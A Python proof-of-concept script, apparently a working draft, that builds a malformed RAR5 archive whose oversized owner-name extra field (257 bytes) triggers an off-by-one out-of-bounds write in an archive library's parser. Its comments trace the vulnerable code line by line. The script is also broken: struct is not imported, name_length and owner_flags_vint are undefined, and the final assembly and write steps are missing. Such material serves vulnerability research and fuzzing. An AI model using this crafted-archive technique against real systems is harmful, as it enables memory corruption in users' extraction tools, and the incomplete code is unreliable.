import zlib

# RAR5 signature
rar5_sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

def encode_vint(value):
    """Encode a value as RAR5 variable-length integer."""
    result = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value > 0:
            b |= 0x80
            result.append(b)
        else:
            result.append(b)
            break
    return bytes(result)

def make_block(header_id, header_flags, body):
    """Create a RAR5 block with proper CRC32."""
    # The header data consists of: header_size_vint + header_id_vint + header_flags_vint + body
    # But CRC is computed over: header_size_len bytes of header_size + rest of header
    # Actually, let me re-read the code...
    # 
    # From process_base_block:
    # 1. read_u32 -> hdr_crc (4 bytes)
    # 2. read_var_sized -> raw_hdr_size, hdr_size_len
    # 3. hdr_size = raw_hdr_size + hdr_size_len
    # 4. read_ahead(hdr_size, &p) -> reads hdr_size bytes
    # 5. CRC32 computed over those hdr_size bytes
    # 6. consume(hdr_size_len)  -- consumes the header size vint itself
    # 7. read_var_sized -> header_id (from remaining raw_hdr_size bytes)
    # 8. read_var_sized -> header_flags
    # 9. ... rest of header
    
    # So the CRC covers: the hdr_size_len bytes (the header size vint) + raw_hdr_size bytes of actual header content
    # And raw_hdr_size = header_id_vint + header_flags_vint + body
    
    header_id_vint = encode_vint(header_id)
    header_flags_vint = encode_vint(header_flags)
    raw_content = header_id_vint + header_flags_vint + body
    raw_hdr_size = len(raw_content)
    
    hdr_size_vint = encode_vint(raw_hdr_size)
    hdr_size_len = len(hdr_size_vint)
    
    # CRC is computed over hdr_size bytes = raw_hdr_size + hdr_size_len
    # which is the hdr_size_vint itself + raw_content
    crc_data = hdr_size_vint + raw_content
    crc = zlib.crc32(crc_data) & 0xFFFFFFFF
    
    return struct.pack('<I', crc) + crc_data

# Build MAIN header (HEAD_MAIN = 0x01)
# Minimal main header: no extra data, archive_flags = 0
# header_flags: no HFL_EXTRA_DATA, no HFL_DATA
main_header_flags = 0  # no extra data, no data
main_body = encode_vint(0)  # archive_flags = 0 (no volume, no solid, etc.)
main_block = make_block(0x01, main_header_flags, main_body)

# Build FILE header (HEAD_FILE = 0x02)
# header_flags: HFL_EXTRA_DATA (0x0001) | HFL_DATA (0x0002) = 0x0003
file_header_flags = 0x0003  # HFL_EXTRA_DATA | HFL_DATA

# Now build the file header body:
# 1. extra_data_size (vint) - since HFL_EXTRA_DATA is set
# 2. data_size (vint) - since HFL_DATA is set
# 3. file_flags (vint)
# 4. unpacked_size (vint)
# 5. file_attr (vint)
# 6. [mtime if UTIME flag]
# 7. [crc if CRC32 flag]
# 8. compression_info (vint)
# 9. host_os (vint)
# 10. name_size (vint)
# 11. name (name_size bytes)
# Then the extra data follows

#   extra_field_size (vint) - consumed
#   extra_field_id (vint) - consumed

#     if OWNER_USER_NAME (0x01): name_len (vint, no consume), read_ahead(name_len), consume(name_len)

# 1. read_var_sized(flags, &value_len) - reads flags, value_len = number of bytes consumed for the vint
# 2. consume(value_len) - consumes those bytes
# 3. *extra_data_size -= value_len

#    e. memcpy(namebuf, p, name_len)

# Then *extra_data_size -= value_len + 1  -- this subtracts (name_length_value + 1)

# Line 1414: read_var_sized(a, &extra_field_size, &var_size) -- reads the field size
# Line 1417: extra_data_size -= var_size  -- subtracts the vint encoding length
# Line 1418: consume(a, var_size) -- consumes it
# Line 1422: read_var_sized(a, &extra_field_id, &var_size) -- reads field id
# Line 1425: extra_data_size -= var_size
# Line 1426: consume(a, var_size)
# Then calls parse_file_extra_owner

# Line 1343: read_var_sized(a, &flags, &value_len) -- reads flags, value_len = vint byte count
# Line 1345: consume(a, value_len)
# Line 1347: *extra_data_size -= value_len
#

#   NOTE: after this call, value_len is the decoded name length value (e.g., 257)
# Line 1352: *extra_data_size -= value_len + 1
#   Hmm wait, value_len here is the NAME LENGTH, not the vint encoding size!
#   This seems like a separate bug in accounting, but let's not worry.
# Line 1353: read_ahead(a, value_len, &p)
# Line 1355-1358: if value_len > 256: name_len = 256 else name_len = value_len
# Line 1359: memcpy(namebuf, p, name_len)
# Line 1360: namebuf[name_len] = 0  <-- INDEX OOB when name_len == 256

# - name length = 257 (or any value > 256, which will be clamped to 256)
# - 257 bytes of name data

name_length_vint = encode_vint(name_length)  # vint encoding of 257
name_data = b'A' * name_length

# The parse_file_extra_owner reads:
# 1. flags vint (read_var_sized with &value_len -> consumes explicitly)
# 2. (consumed via consume(value_len))
# 3. name_length vint (read_var_sized with NULL -> auto-consumed)
# 4. name_data (read_ahead + consume)

owner_payload = owner_flags_vint + name_length_vint + name_data

# Now build the extra field wrapper:
# extra_field_size (vint) - this value seems to be read but not used for bounds
# extra_field_id (vint) = 0x06 (EX_UOWNER)

extra_field_id = 0x06
extra_field_id_vint = encode_vint(extra_field_id)

# extra_field_size: I'll compute it. In process_head_file_extra, after reading
# extra_field_size and extra_field_id, it just calls parse_file_extra_owner.
# The actual size isn't used as a bounds check in the vulnerable code, so any 
# reasonable value should work.
# Let's set it to the total size of the owner payload
extra_field_size_vint = encode_vint(len(owner_payload) + len(extra_field_id_vint))

extra_data = extra_field_size_vint + extra_field_id_vint + owner_payload

# extra_data_size in process_head_file is the total size of extra_data
extra_data_size = len(extra_data)

# Now build the file header body
file_flags = 0x0006  # UTIME (0x0002) | CRC32 (0x0004)
# Actually let's simplify: no UTIME, no CRC32
file_flags = 0x0000  # no flags

data_size = 0  # Wait, HFL_DATA requires data_size but line 1505 says "no data found" returns FATAL
# So we need data_size > 0
data_size = 1  # minimal

unpacked_size = 1
file_attr = 0o100644  # regular file
compression_info = 0  # method=0, version=0
host_os = 1  # HOST_UNIX
name = b'test.txt'
name_size = len(name)

file_body = b''
file_body += encode_vint(extra_data_size)  # extra_data_size (since HFL_EXTRA_DATA)
file_body += encode_vint(data_size)        # data_size (since HFL_DATA)
file_body += encode_vint(file_flags)       # file_flags
file_body += encode_vint(unpacked_size)    # unpacked_size
file_body += encode_vint(file_attr)        # file_attr
# no mtime (UTIME not set)
# no crc (CRC32 not set)
file_body += encode_vint(compression_info) # compression_info
file_body += encode_vint(host_os)          # host_os
file_body += encode_vint(name_size)        # name_size
file_body += name                          # name data
file_body += extra_data                    # extra data content

file_block = make_block(0x02, file_header_flags, file_body)

# Assemble the full RAR5 file

# Write it

print(f"Owner flags vint: {owner_flags_vint.hex()}")
